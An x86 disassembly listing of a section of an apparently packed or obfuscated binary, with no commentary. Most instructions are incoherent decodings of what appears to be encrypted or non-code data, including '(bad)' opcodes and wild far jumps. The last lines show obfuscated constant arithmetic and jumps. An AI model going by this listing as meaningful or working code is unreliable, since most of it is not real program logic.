  41e25b:	mov    bl,0xff
  41e25d:	fwait
  41e25e:	pop    esp
  41e25f:	mov    esp,0x47051ac2
  41e264:	xchg   ebx,eax
  41e265:	inc    ebx
  41e266:	es pushf 
  41e268:	lods   eax,DWORD PTR ds:[esi]
  41e26a:	xor    ch,BYTE PTR [ebx-0x3970b9a4]
  41e270:	sbb    eax,0xf3957915
  41e275:	xor    DWORD PTR [esi+eiz*8-0x15],edi
  41e279:	pop    es
  41e27a:	or     al,0xd9
  41e27c:	daa    
  41e27d:	outs   dx,DWORD PTR ds:[esi]
  41e27e:	xchg   esi,eax
  41e27f:	les    edi,FWORD PTR fs:[esi+0x7a]
  41e283:	stos   BYTE PTR es:[edi],al
  41e284:	hlt    
  41e285:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e286:	sbb    bh,BYTE PTR [ebx-0x6]
  41e289:	stos   DWORD PTR es:[edi],eax
  41e28a:	mov    DWORD PTR [ecx+0x72247707],eax
  41e290:	scas   eax,DWORD PTR es:[edi]
  41e291:	js     0x41e2d9
  41e293:	mov    ch,ch
  41e295:	cmp    al,0xc4
  41e297:	jp     0x41e238
  41e299:	ins    DWORD PTR es:[edi],dx
  41e29a:	pop    edi
  41e29b:	pop    eax
  41e29c:	xchg   edi,eax
  41e29d:	scas   eax,DWORD PTR es:[edi]
  41e29e:	mov    ecx,0xb50ffb07
  41e2a3:	imul   ebp,DWORD PTR [edi+ebx*2],0xffffff91
  41e2a7:	cwde   
  41e2a8:	add    eax,0x3583419f
  41e2ad:	xrelease xchg DWORD PTR [edi],edx
  41e2b0:	xchg   ebp,eax
  41e2b1:	dec    bl
  41e2b3:	adc    BYTE PTR fs:[edx],bh
  41e2b6:	ss xchg ecx,eax
  41e2b8:	adc    al,0x42
  41e2ba:	mov    ebx,DWORD PTR [ebx+0x5eac6917]
  41e2c0:	sub    BYTE PTR [eax+ebx*8],bl
  41e2c3:	and    BYTE PTR [ebx-0x7b],0x6a
  41e2c7:	and    edi,DWORD PTR [eax-0x7f]
  41e2ca:	into   
  41e2cb:	dec    ebx
  41e2cc:	add    al,0xfb
  41e2ce:	pop    ss
  41e2cf:	test   al,0x91
  41e2d1:	cmp    eax,0x2f3739cb
  41e2d6:	dec    ebx
  41e2d7:	or     DWORD PTR [ebp-0x71],0xf64983e6
  41e2de:	mov    cl,0x8b
  41e2e0:	sbb    dl,BYTE PTR [eax]
  41e2e2:	mov    bh,0x45
  41e2e5:	in     eax,dx
  41e2e6:	lock mov al,ds:0xb7da686d
  41e2ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2ed:	inc    ecx
  41e2ee:	or     dl,BYTE PTR [esi]
  41e2f0:	pop    ebp
  41e2f1:	or     BYTE PTR [ebx+0xc],al
  41e2f4:	push   ebp
  41e2f5:	aam    0xf9
  41e2f7:	daa    
  41e2f8:	mov    ah,0xaa
  41e2fa:	add    dl,al
  41e2fc:	aaa    
  41e2fd:	jmp    0xda8a2fa9
  41e302:	jmp    0xac009de8
  41e307:	test   al,0x77
  41e309:	xor    eax,DWORD PTR [ebx-0x2b4eeddd]
  41e30f:	js     0x41e2d5
  41e311:	and    bh,BYTE PTR [ebx]
  41e313:	shl    dl,1
  41e315:	sbb    eax,0x98068092
  41e31a:	mov    edx,0x8c58f174
  41e31f:	jge    0x41e2cf
  41e321:	dec    ecx
  41e322:	out    dx,eax
  41e323:	les    eax,FWORD PTR [eax]
  41e325:	xchg   cl,ch
  41e327:	or     al,0xb7
  41e329:	push   ebx
  41e32a:	ds add al,0xc8
  41e32d:	dec    ebx
  41e32e:	inc    edi
  41e32f:	les    ebx,FWORD PTR [edi+0x30]
  41e332:	retf   
  41e333:	int    0x36
  41e335:	dec    ebx
  41e336:	int    0xaa
  41e338:	shl    DWORD PTR [ebx],0x40
  41e33b:	push   edx
  41e33c:	mov    edi,0x9050b73b
  41e341:	inc    edx
  41e342:	pushf  
  41e343:	test   eax,0x6e877006
  41e348:	call   0x66917c6e
  41e34d:	pop    edx
  41e34e:	jp     0x41e338
  41e350:	push   esp
  41e351:	in     eax,dx
  41e352:	mov    ah,0x22
  41e354:	aam    0xa9
  41e356:	fcmovu st,st(0)
  41e358:	cwde   
  41e359:	imul   ecx,DWORD PTR [ecx+0x76096025],0xffffffb2
  41e360:	jecxz  0x41e307
  41e362:	pop    ds
  41e363:	jg     0x41e3e0
  41e365:	add    eax,0x4647ad05
  41e36a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e36b:	or     dl,BYTE PTR [ebp+0x682238f5]
  41e371:	dec    esi
  41e372:	lds    edx,FWORD PTR [ebp-0x72]
  41e375:	fiadd  DWORD PTR [ebx-0x2c]
  41e378:	jo     0x41e3f1
  41e37a:	jae    0x41e328
  41e37c:	mov    ds:0x97e19aa,eax
  41e381:	pop    ecx
  41e382:	mov    ecx,0xbcb1565e
  41e387:	or     al,0x3a
  41e389:	cmp    bl,0x6d
  41e38c:	out    dx,al
  41e38d:	sub    eax,edx
  41e38f:	fs inc ecx
  41e391:	xchg   edi,eax
  41e392:	sbb    al,0xbe
  41e394:	xor    al,0x1d
  41e396:	fcom   DWORD PTR [eax-0x54]
  41e399:	sub    dl,bh
  41e39b:	pop    esp
  41e39c:	mov    cl,0xc0
  41e39e:	cmp    eax,0x34d5e673
  41e3a3:	into   
  41e3a4:	mov    eax,0x4f6d9c91
  41e3a9:	loop   0x41e38a
  41e3ab:	push   ecx
  41e3ac:	pop    esi
  41e3ad:	xor    eax,eax
  41e3af:	sti    
  41e3b0:	repz imul ebx,DWORD PTR [ebx],0x6d9e77d8
  41e3b7:	dec    ebx
  41e3b8:	adc    esp,ebx
  41e3ba:	push   0x674ff801
  41e3bf:	pop    es
  41e3c0:	ds scas al,BYTE PTR es:[edi]
  41e3c2:	xchg   edi,eax
  41e3c3:	nop
  41e3c4:	scas   al,BYTE PTR es:[edi]
  41e3c5:	outs   dx,DWORD PTR ds:[esi]
  41e3c6:	pop    edx
  41e3c7:	mov    cs,WORD PTR fs:[edx-0x10]
  41e3cb:	xor    eax,0x4350c3d5
  41e3d0:	mov    ch,0xf9
  41e3d2:	mov    bh,0x33
  41e3d4:	mov    bh,0xb
  41e3d6:	xchg   esi,eax
  41e3d7:	xchg   esp,eax
  41e3d8:	jae    0x41e425
  41e3da:	inc    ebx
  41e3db:	pop    ebp
  41e3dc:	cwde   
  41e3dd:	div    DWORD PTR [ebx-0x3f3b9bb9]
  41e3e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3e4:	gs xchg ebp,eax
  41e3e6:	out    dx,eax
  41e3e7:	sub    BYTE PTR [eax-0x627b03d6],bl
  41e3ed:	add    al,0x2d
  41e3ef:	push   es
  41e3f0:	push   esp
  41e3f1:	icebp  
  41e3f2:	mov    esi,0x4cb57c42
  41e3f7:	dec    eax
  41e3f8:	pop    esp
  41e3f9:	into   
  41e3fa:	out    0xcd,al
  41e3fc:	mov    BYTE PTR [ebx-0x17],bh
  41e3ff:	cmp    eax,0xff0e7113
  41e404:	fs fs pushf 
  41e407:	bound  esi,QWORD PTR ds:0x386abb5b
  41e40d:	(bad)  
  41e40e:	sbb    bl,BYTE PTR [ebp+0xe]
  41e411:	inc    edx
  41e412:	(bad)  
  41e413:	sub    al,0x26
  41e415:	outs   dx,DWORD PTR ds:[esi]
  41e416:	adc    ebx,DWORD PTR [ebx-0x72]
  41e419:	adc    BYTE PTR [eax-0x74],ah
  41e41c:	push   ebx
  41e41d:	aad    0x42
  41e41f:	in     eax,0x28
  41e421:	hlt    
  41e422:	add    BYTE PTR [edi+0x2fd13235],ch
  41e428:	mov    eax,0x7cf92dd4
  41e42d:	stc    
  41e42e:	fisub  WORD PTR [edi-0x12efe834]
  41e434:	loop   0x41e45a
  41e436:	add    al,BYTE PTR [ebx]
  41e438:	inc    esp
  41e439:	or     eax,0x272fe50e
  41e43e:	and    BYTE PTR [edx+ecx*1+0x40],cl
  41e442:	or     edx,eax
  41e444:	mov    ecx,0x7e9b9ccf
  41e449:	loop   0x41e40a
  41e44b:	int    0x15
  41e44d:	mov    BYTE PTR ds:0x113e5a7a,0xe6
  41e454:	(bad)
  41e458:	mov    dh,BYTE PTR [edx*8+0x52fcdc29]
  41e45f:	xchg   ecx,eax
  41e460:	push   ss
  41e461:	xchg   edx,eax
  41e462:	push   edx
  41e463:	jmp    0xc666:0x107f03e0
  41e46a:	aam    0x43
  41e46c:	xor    eax,DWORD PTR [edx]
  41e46e:	xchg   edx,eax
  41e46f:	and    edi,eax
  41e471:	cmc    
  41e472:	push   0x836827c
  41e477:	mov    DWORD PTR [esi+0x18],ebx
  41e47a:	pop    esp
  41e47b:	pop    ebp
  41e47c:	int3   
  41e47d:	mov    WORD PTR [ecx-0x7a88dcf3],?
  41e483:	push   cs
  41e484:	lahf   
  41e485:	dec    eax
  41e486:	retf   0xbf20
  41e489:	jmp    0xe10fb7c8
  41e48e:	sbb    eax,0x8a33801d
  41e493:	pop    edi
  41e494:	mov    edx,0x7b0409c0
  41e499:	mov    dh,0x30
  41e49b:	xlat   BYTE PTR ds:[ebx]
  41e49c:	pop    edi
  41e49d:	mov    bl,0xe4
  41e49f:	ins    BYTE PTR es:[edi],dx
  41e4a0:	fcomip st,st(5)
  41e4a2:	jbe    0x41e498
  41e4a4:	mov    edi,0x3811b360
  41e4a9:	enter  0x7794,0x43
  41e4ad:	cld    
  41e4ae:	out    dx,eax
  41e4af:	jnp    0x41e49b
  41e4b1:	push   0x971f6853
  41e4b6:	loopne 0x41e4c1
  41e4b8:	sub    edx,DWORD PTR ds:0xf43b2ab1
  41e4be:	out    dx,eax
  41e4bf:	push   ebp
  41e4c0:	adc    eax,edx
  41e4c2:	popf   
  41e4c3:	sbb    al,0xed
  41e4c5:	sbb    bl,BYTE PTR [eax-0x1a97fff9]
  41e4cb:	das    
  41e4cc:	stos   DWORD PTR es:[edi],eax
  41e4cd:	ds or  bl,ch
  41e4d0:	xor    BYTE PTR [ebx],ch
  41e4d2:	in     al,0x86
  41e4d4:	jle    0x41e47e
  41e4d6:	mov    bl,0x42
  41e4d8:	lahf   
  41e4d9:	push   0xfffffff2
  41e4db:	xchg   ebp,eax
  41e4dc:	fcom   DWORD PTR [edx-0x397e9053]
  41e4e2:	das    
  41e4e3:	sbb    al,0xfa
  41e4e5:	frstor [edx+ebx*2+0x277987ed]
  41e4ec:	cdq    
  41e4ed:	clc    
  41e4ee:	xor    dh,al
  41e4f0:	pusha  
  41e4f1:	jne    0x41e55d
  41e4f3:	cli    
  41e4f4:	retf   
  41e4f5:	out    dx,eax
  41e4f6:	(bad)  
  41e4f7:	sub    eax,0x2577110e
  41e4fc:	xlat   BYTE PTR ds:[ebx]
  41e4fd:	ins    DWORD PTR es:[edi],dx
  41e4fe:	mov    ecx,0xa4661311
  41e503:	mov    eax,ds:0xa8b25b5b
  41e508:	or     dl,BYTE PTR [ebx-0x1b]
  41e50b:	inc    esp
  41e50c:	not    eax
  41e50e:	and    eax,0x86119966
  41e513:	push   ebp
  41e514:	lods   al,BYTE PTR ds:[esi]
  41e515:	lds    ebx,FWORD PTR [edi+0x1d783219]
  41e51b:	mov    ds:0x1bd4f659,eax
  41e520:	jbe    0x41e59d
  41e522:	and    bh,BYTE PTR [edx-0x55]
  41e525:	or     eax,esi
  41e527:	out    0xa8,eax
  41e529:	ss aam 0x43
  41e52c:	aad    0x8
  41e52e:	rcl    bl,1
  41e530:	add    DWORD PTR [ebp-0x18],ebp
  41e533:	retf   
  41e534:	mov    al,ds:0x9644e82e
  41e539:	pop    ebx
  41e53a:	sar    al,0x11
  41e53d:	ss std 
  41e53f:	scas   al,BYTE PTR es:[edi]
  41e540:	pop    es
  41e541:	(bad)  
  41e542:	xlat   BYTE PTR ds:[ebx]
  41e543:	dec    ebp
  41e544:	shl    BYTE PTR [edx+0x53],0xe4
  41e548:	jbe    0x41e551
  41e54a:	(bad)  
  41e54b:	mov    ah,0xca
  41e54d:	and    BYTE PTR [esi-0x1d],ah
  41e550:	dec    ebx
  41e551:	test   BYTE PTR [edx+ecx*2+0x7a],bh
  41e555:	or     cl,BYTE PTR [esi]
  41e557:	ret    0x4e5e
  41e55a:	xchg   ecx,eax
  41e55b:	lods   al,BYTE PTR ds:[esi]
  41e55c:	fist   WORD PTR [esi-0x7c]
  41e55f:	rcl    ebp,1
  41e561:	sar    DWORD PTR [esi-0x15509a17],0xb3
  41e568:	dec    ecx
  41e569:	lods   eax,DWORD PTR ds:[esi]
  41e56a:	ins    BYTE PTR es:[edi],dx
  41e56b:	retf   
  41e56c:	mov    edi,0xab5e52d7
  41e571:	and    BYTE PTR [edx-0x66],0x2e
  41e575:	imul   esi,DWORD PTR [edx+0x2],0x8814d87
  41e57c:	stos   BYTE PTR es:[edi],al
  41e57d:	adc    BYTE PTR [eax+0x5c],dl
  41e580:	mov    edx,0x37d21cd2
  41e585:	cli    
  41e586:	div    BYTE PTR [ebx-0x480c54ba]
  41e58c:	and    BYTE PTR [ecx-0x1285f206],bh
  41e592:	or     al,0xa1
  41e594:	aas    
  41e595:	inc    edi
  41e596:	sub    DWORD PTR [ecx+ebx*2],ecx
  41e599:	and    dl,BYTE PTR [edi]
  41e59b:	and    dl,BYTE PTR [ecx]
  41e59d:	xchg   ebx,eax
  41e59e:	cmp    BYTE PTR [ebp+0x184de869],dh
  41e5a4:	arpl   WORD PTR [edi],bx
  41e5a6:	rcr    BYTE PTR [ecx],1
  41e5a8:	add    dl,bl
  41e5aa:	fcomp  DWORD PTR [ecx+eiz*8]
  41e5ad:	test   eax,0x6a59ea14
  41e5b2:	push   eax
  41e5b3:	mov    BYTE PTR [ecx+0x6c],dh
  41e5b6:	std    
  41e5b7:	xchg   esi,eax
  41e5b8:	push   ebp
  41e5b9:	mov    al,ds:0x95569143
  41e5be:	das    
  41e5bf:	cmp    ecx,esp
  41e5c1:	jmp    0x27de:0xdd4df4a
  41e5c8:	gs cmp al,0x66
  41e5cb:	jnp    0x41e5ba
  41e5cd:	out    dx,al
  41e5ce:	sbb    BYTE PTR [eax],0x72
  41e5d1:	fwait
  41e5d2:	or     al,0x8e
  41e5d4:	or     eax,ecx
  41e5d6:	mov    ecx,edx
  41e5d8:	push   esi
  41e5d9:	jns    0x41e628
  41e5db:	jae    0x41e569
  41e5dd:	dec    esi
  41e5de:	fs mov eax,0x4dedc5b
  41e5e4:	pop    edx
  41e5e5:	dec    esp
  41e5e6:	into   
  41e5e7:	sahf   
  41e5e8:	int3   
  41e5e9:	inc    esi
  41e5ea:	stos   BYTE PTR es:[edi],al
  41e5eb:	sbb    al,0x77
  41e5ed:	popa   
  41e5ee:	pop    edi
  41e5ef:	stos   BYTE PTR es:[edi],al
  41e5f0:	xchg   esi,eax
  41e5f1:	fbstp  TBYTE PTR [ebp-0x2977ef44]
  41e5f7:	jo     0x41e592
  41e5f9:	jmp    0x41e63c
  41e5fb:	fstp   DWORD PTR [ebx+0x3d]
  41e5fe:	sbb    bh,BYTE PTR [ecx]
  41e600:	sub    al,0x93
  41e602:	dec    ebx
  41e603:	jo     0x41e5ae
  41e605:	pusha  
  41e606:	das    
  41e607:	xchg   ecx,eax
  41e608:	adc    ah,ah
  41e60a:	xchg   DWORD PTR [ecx+0x6e06f0e0],esi
  41e610:	xor    al,0x9f
  41e612:	cli    
  41e613:	arpl   WORD PTR [ebx],si
  41e615:	inc    esi
  41e616:	jecxz  0x41e658
  41e618:	(bad)  
  41e619:	repz dec edx
  41e61b:	in     eax,dx
  41e61c:	sbb    ecx,DWORD PTR [ebx+eax*1]
  41e61f:	nop
  41e620:	inc    dh
  41e622:	adc    DWORD PTR [ebx-0x20f667f3],esp
  41e628:	inc    edi
  41e629:	ds inc edx
  41e62b:	mov    edx,0xac0225e
  41e630:	mov    al,0x5f
  41e632:	dec    ecx
  41e633:	push   0x7c5f9c26
  41e638:	push   esp
  41e639:	mov    esp,0x79eccfeb
  41e63e:	or     DWORD PTR [ebx],0xffffffdc
  41e641:	jl     0x41e6b6
  41e643:	fld    QWORD PTR [edx-0x65]
  41e646:	loop   0x41e6bf
  41e648:	xchg   ecx,eax
  41e649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e64a:	sahf   
  41e64b:	sbb    al,BYTE PTR [edi+0x5]
  41e64e:	stos   DWORD PTR es:[edi],eax
  41e64f:	retf   0x8477
  41e652:	mov    ebp,DWORD PTR [edi+0x6e102a30]
  41e658:	and    BYTE PTR [eax+0x3c],al
  41e65b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e65c:	xchg   ebp,eax
  41e65d:	ret    0xbf1a
  41e660:	rcr    BYTE PTR [edi+0x53349982],cl
  41e666:	cwde   
  41e667:	push   ss
  41e668:	(bad)  
  41e669:	rcl    bl,cl
  41e66b:	pop    esp
  41e66c:	call   0xd629ce84
  41e671:	dec    edi
  41e672:	loope  0x41e6ca
  41e674:	cmp    eax,0x57a99fd1
  41e679:	xchg   edx,eax
  41e67a:	mov    bl,0x17
  41e67c:	or     DWORD PTR [edx+edx*4+0x3a],edi
  41e680:	push   ds
  41e681:	pop    ecx
  41e682:	lock xor eax,ecx
  41e685:	inc    ebx
  41e686:	jnp    0x41e692
  41e688:	sar    esp,cl
  41e68a:	mov    bh,0x2b
  41e68c:	xchg   ebx,eax
  41e68d:	aas    
  41e68e:	adc    BYTE PTR [esi],0x21
  41e691:	ss popa 
  41e693:	shr    BYTE PTR [ecx],1
  41e695:	inc    esp
  41e696:	push   0xffffffb7
  41e698:	or     DWORD PTR [ebp-0x4a895777],0x6
  41e69f:	pop    eax
  41e6a0:	add    BYTE PTR [ebx],bh
  41e6a2:	push   eax
  41e6a3:	ins    BYTE PTR es:[edi],dx
  41e6a4:	and    dh,BYTE PTR [ebx]
  41e6a6:	mov    ebp,0xde8769d5
  41e6ab:	loopne 0x41e694
  41e6ad:	push   ecx
  41e6ae:	fstp   TBYTE PTR [edx-0x23fc6015]
  41e6b4:	mov    ds:0xc75ed8be,al
  41e6b9:	sub    eax,0x3671ae3f
  41e6be:	xor    al,0xba
  41e6c0:	fldz   
  41e6c2:	sbb    cl,cl
  41e6c4:	jb     0x41e6b2
  41e6c6:	pop    esi
  41e6c7:	add    BYTE PTR [edx+ebx*1-0xb],dl
  41e6cb:	pusha  
  41e6cc:	in     al,0x96
  41e6ce:	ins    DWORD PTR es:[edi],dx
  41e6cf:	cmp    bh,BYTE PTR [ecx]
  41e6d1:	push   DWORD PTR [eax]
  41e6d3:	cdq    
  41e6d4:	and    DWORD PTR [ecx+eax*4+0x3767d789],edi
  41e6db:	sub    BYTE PTR [edi-0x12],dh
  41e6de:	je     0x41e6f8
  41e6e0:	sub    edx,eax
  41e6e2:	aas    
  41e6e3:	ins    BYTE PTR es:[edi],dx
  41e6e4:	mov    dl,0x8a
  41e6e6:	xor    eax,0xe425ea9b
  41e6eb:	pop    eax
  41e6ec:	bound  ebp,QWORD PTR [edx]
  41e6ee:	and    eax,0x5c6d713d
  41e6f3:	add    eax,0x5f38351b
  41e6f8:	fldcw  WORD PTR [esi+0x1462d396]
  41e6fe:	pop    edx
  41e6ff:	push   ebp
  41e700:	push   esp
  41e701:	imul   esp,DWORD PTR [ecx],0x12a10de3
  41e707:	(bad)  
  41e708:	(bad)  
  41e709:	mov    esp,0x8ccc401c
  41e70e:	xchg   BYTE PTR [ecx-0x12],al
  41e711:	scas   al,BYTE PTR es:[edi]
  41e712:	dec    ebx
  41e713:	inc    ebx
  41e714:	add    al,0xd8
  41e716:	push   ecx
  41e717:	fcomp  QWORD PTR ds:0x175d9eb
  41e71d:	and    esi,esp
  41e71f:	pushf  
  41e720:	test   eax,0xd6214a18
  41e725:	sub    al,0x51
  41e727:	lods   eax,DWORD PTR ds:[esi]
  41e728:	and    dh,cl
  41e72a:	mov    eax,0xc272e972
  41e72f:	test   DWORD PTR [eax+edx*2],0x967516e1
  41e736:	ret    
  41e737:	lock xlat BYTE PTR ds:[ebx]
  41e739:	stos   BYTE PTR es:[edi],al
  41e73a:	daa    
  41e73b:	inc    ebp
  41e73c:	inc    ecx
  41e73d:	jnp    0x41e739
  41e73f:	xor    DWORD PTR [ebx-0x5aa939dd],edx
  41e745:	retf   0x532e
  41e748:	sbb    eax,0x1f06c06
  41e74d:	push   edi
  41e74e:	adc    DWORD PTR [esi+0x7ffa9293],ecx
  41e754:	jl     0x41e7b1
  41e756:	lock xchg ebx,eax
  41e758:	imul   ecx,DWORD PTR ds:0xe13bce50,0xffffffce
  41e75f:	in     al,0x28
  41e761:	out    dx,eax
  41e762:	mov    DWORD PTR [ebx-0x13513c92],edx
  41e768:	jg     0x41e6eb
  41e76a:	push   ds
  41e76b:	fcom   DWORD PTR [edi]
  41e76d:	dec    eax
  41e76e:	push   0x8d5d84f3
  41e773:	cmc    
  41e774:	or     eax,0x6b5b99a1
  41e779:	test   al,0x77
  41e77b:	xchg   edi,eax
  41e77c:	nop
  41e77d:	sbb    bh,dh
  41e77f:	sbb    al,0x4c
  41e781:	xchg   ebx,eax
  41e782:	dec    ecx
  41e783:	cmp    DWORD PTR ds:0xd7fae01f,ebp
  41e789:	add    bl,bl
  41e78b:	sub    DWORD PTR [edx+0x4348e9d],esp
  41e791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e792:	shl    cl,1
  41e794:	push   edi
  41e795:	cwde   
  41e796:	mov    ch,0x9f
  41e798:	fnstsw WORD PTR [esi]
  41e79a:	push   ebp
  41e79b:	jnp    0x41e73a
  41e79d:	or     DWORD PTR [eax+0x69],esi
  41e7a0:	xchg   edi,eax
  41e7a1:	xlat   BYTE PTR ds:[ebx]
  41e7a2:	adc    DWORD PTR [ebx],0x3d67475b
  41e7a8:	xor    DWORD PTR [edx+esi*2+0x7c],esp
  41e7ac:	adc    ebx,0x51
  41e7af:	mov    bl,0xb9
  41e7b1:	int    0xcc
  41e7b3:	icebp  
  41e7b4:	nop
  41e7b5:	inc    esp
  41e7b6:	mov    WORD PTR [eax+0x4ce9c6e3],fs
  41e7bc:	inc    esi
  41e7bd:	dec    ecx
  41e7be:	dec    ebx
  41e7bf:	into   
  41e7c0:	xchg   ebx,eax
  41e7c1:	outs   dx,DWORD PTR ds:[esi]
  41e7c2:	loop   0x41e74b
  41e7c4:	xor    DWORD PTR [edx+0x31c78684],ebx
  41e7ca:	xchg   BYTE PTR [edi+0x1b1274c],bl
  41e7d0:	cmc    
  41e7d1:	popa   
  41e7d2:	sub    DWORD PTR [si+0x5f],esp
  41e7d6:	dec    ecx
  41e7d7:	stos   BYTE PTR es:[edi],al
  41e7d8:	and    DWORD PTR [eax],esi
  41e7da:	push   ss
  41e7db:	ds pushf 
  41e7dd:	mov    ecx,DWORD PTR [esi+0x54fbacea]
  41e7e3:	jmp    0x41e792
  41e7e5:	mov    BYTE PTR [eax],ah
  41e7e7:	push   esi
  41e7e8:	mov    dh,BYTE PTR [esi+0x3a17a49a]
  41e7ee:	jge    0x41e7e8
  41e7f0:	pop    ebx
  41e7f1:	adc    BYTE PTR [edi+0x66ef9009],bh
  41e7f7:	(bad)  
  41e7f8:	mov    bh,0x49
  41e7fa:	jo     0x41e83e
  41e7fc:	pop    esp
  41e7fd:	sbb    BYTE PTR [edi],0xd3
  41e800:	inc    esi
  41e801:	inc    edi
  41e802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e803:	daa    
  41e804:	repnz repnz inc eax
  41e807:	stos   BYTE PTR es:[edi],al
  41e808:	add    BYTE PTR [ecx-0x231d281a],dh
  41e80e:	pop    ebx
  41e80f:	mov    ebp,0x8c5d7729
  41e814:	dec    ebp
  41e815:	ret    0x2734
  41e818:	(bad)  
  41e819:	arpl   WORD PTR [ecx*2+0x1300168],bp
  41e820:	into   
  41e821:	cmp    BYTE PTR [esi+0x6f],ah
  41e824:	sub    esp,0xffffff88
  41e827:	cwde   
  41e828:	fmul   DWORD PTR [eax+0x75]
  41e82b:	push   0x46
  41e82d:	xchg   DWORD PTR [edx],esp
  41e82f:	inc    ebx
  41e830:	adc    DWORD PTR [ecx+0x71ef7e42],esp
  41e836:	cmp    eax,0x24178c9
  41e83b:	dec    esi
  41e83c:	stc    
  41e83d:	and    al,0xd
  41e83f:	dec    esi
  41e840:	add    DWORD PTR [ecx+0x40],edi
  41e843:	cwde   
  41e844:	xchg   esi,eax
  41e845:	cmp    al,0x29
  41e847:	int3   
  41e848:	inc    edx
  41e849:	or     DWORD PTR [edx+ebx*2+0x2e9cd8a2],ebp
  41e850:	dec    esi
  41e851:	scas   al,BYTE PTR es:[edi]
  41e852:	or     al,0xa6
  41e854:	xchg   ebp,eax
  41e855:	jge    0x41e8d5
  41e857:	dec    edx
  41e858:	arpl   WORD PTR [edx-0x45],bp
  41e85b:	fidivr DWORD PTR [edx]
  41e85d:	sahf   
  41e85e:	push   es
  41e85f:	mov    esi,ss
  41e861:	mov    eax,0xaba0876d
  41e866:	add    bh,BYTE PTR [esi-0x71]
  41e869:	cmp    al,0x16
  41e86b:	dec    edx
  41e86c:	pop    ecx
  41e86d:	mov    esp,0x83b34070
  41e872:	jge    0x41e891
  41e874:	loopne 0x41e892
  41e876:	pushf  
  41e877:	ja     0x41e8a7
  41e879:	lods   eax,DWORD PTR ds:[esi]
  41e87a:	xchg   BYTE PTR [eax+0x37b15835],dh
  41e880:	retf   0xc890
  41e883:	sbb    dh,bh
  41e885:	dec    ebp
  41e886:	cmp    edx,edx
  41e888:	or     al,0xbd
  41e88a:	add    BYTE PTR [ecx+0x47],dh
  41e88d:	ror    ebx,cl
  41e88f:	mov    al,ds:0xdd73dd02
  41e894:	clc    
  41e895:	or     ebp,DWORD PTR [edi]
  41e897:	xchg   ebx,eax
  41e898:	int3   
  41e899:	mov    al,ds:0xc6ba99e2
  41e89e:	retf   
  41e89f:	xor    BYTE PTR [eax+0x71],ch
  41e8a2:	mov    cl,0x49
  41e8a4:	sub    BYTE PTR [ebp+0x46f57e88],dh
  41e8aa:	inc    eax
  41e8ab:	push   es
  41e8ac:	xchg   edx,eax
  41e8ad:	imul   esi,ebp,0xf139fc0
  41e8b3:	aas    
  41e8b4:	ins    BYTE PTR es:[edi],dx
  41e8b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8b6:	sub    al,0xa2
  41e8b8:	inc    edi
  41e8b9:	fsubr  QWORD PTR ds:0x4a354d1
  41e8bf:	jns    0x41e8b0
  41e8c1:	ins    DWORD PTR es:[edi],dx
  41e8c2:	xlat   BYTE PTR ds:[ebx]
  41e8c3:	les    ecx,FWORD PTR [ecx-0x5b034a41]
  41e8c9:	or     esi,DWORD PTR [eax+0x50]
  41e8cc:	sbb    al,0x8f
  41e8ce:	sti    
  41e8cf:	aas    
  41e8d0:	pop    esp
  41e8d1:	push   0x5
  41e8d3:	adc    al,0xda
  41e8d5:	ins    DWORD PTR es:[edi],dx
  41e8d6:	pusha  
  41e8d7:	fisub  DWORD PTR [ebx+0x11]
  41e8da:	cmp    al,0x2d
  41e8dc:	ja     0x41e8d7
  41e8de:	jne    0x41e863
  41e8e0:	xor    DWORD PTR [ecx],edi
  41e8e2:	shr    bl,0xbb
  41e8e5:	mov    fs,WORD PTR [eax+0x392d03aa]
  41e8eb:	cwde   
  41e8ec:	xor    eax,0xd663bf6e
  41e8f1:	add    DWORD PTR [ecx],ebx
  41e8f3:	inc    edi
  41e8f4:	je     0x41e8db
  41e8f6:	mov    ds:0x350cf1bb,al
  41e8fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8fc:	popf   
  41e8fd:	push   0xb3d772a6
  41e902:	push   0x78498225
  41e907:	je     0x41e93f
  41e909:	jno    0x41e8a1
  41e90b:	out    dx,eax
  41e90c:	inc    ebp
  41e90d:	sbb    ebp,ebp
  41e90f:	scas   eax,DWORD PTR es:[edi]
  41e910:	fistp  QWORD PTR [edx]
  41e912:	out    dx,al
  41e913:	out    0x83,al
  41e915:	cmp    ch,ah
  41e917:	or     eax,0xc0083c29
  41e91c:	stos   BYTE PTR es:[edi],al
  41e91d:	mov    eax,ds:0xac9cb68a
  41e922:	mov    al,ds:0x27292970
  41e927:	adc    al,0xe1
  41e929:	or     cl,BYTE PTR [ebp-0x2b]
  41e92c:	(bad)  
  41e92d:	xchg   edx,eax
  41e92e:	push   esi
  41e92f:	lds    esi,FWORD PTR [edi+0x2865a340]
  41e935:	pop    ebx
  41e936:	jnp    0x41e90b
  41e938:	test   al,0xb5
  41e93a:	stos   DWORD PTR es:[edi],eax
  41e93b:	mov    dh,0xf
  41e93d:	retf   
  41e93e:	cmp    DWORD PTR [edx-0x6bb0e51d],ecx
  41e944:	push   esp
  41e945:	xlat   BYTE PTR ds:[ebx]
  41e946:	std    
  41e947:	je     0x41e8f0
  41e949:	std    
  41e94a:	iret   
  41e94b:	mov    eax,0xce03d033
  41e950:	add    edx,esi
  41e952:	cmp    ecx,edx
  41e954:	jae    0x420d77
  41e95a:	lea    edx,[ecx-0x3272dd]
  41e960:	mov    DWORD PTR [ebp-0x18],edx
  41e963:	mov    edi,DWORD PTR [ebp-0x18]
  41e966:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  41e96d:	lea    edx,[ebp-0x24]
  41e970:	mov    DWORD PTR [ebp-0x10],edx
  41e973:	mov    edx,DWORD PTR [ebp-0x10]
  41e976:	add    DWORD PTR [edx],0x705fa0f
  41e97c:	mov    ebx,DWORD PTR [ebp-0x10]
  41e97f:	xor    edi,eax
  41e981:	add    edi,DWORD PTR [ebx]
  41e983:	lea    edx,[ebp+ecx*4-0x64]
  41e987:	mov    ebx,DWORD PTR [edx]
  41e989:	jmp    0x420d16
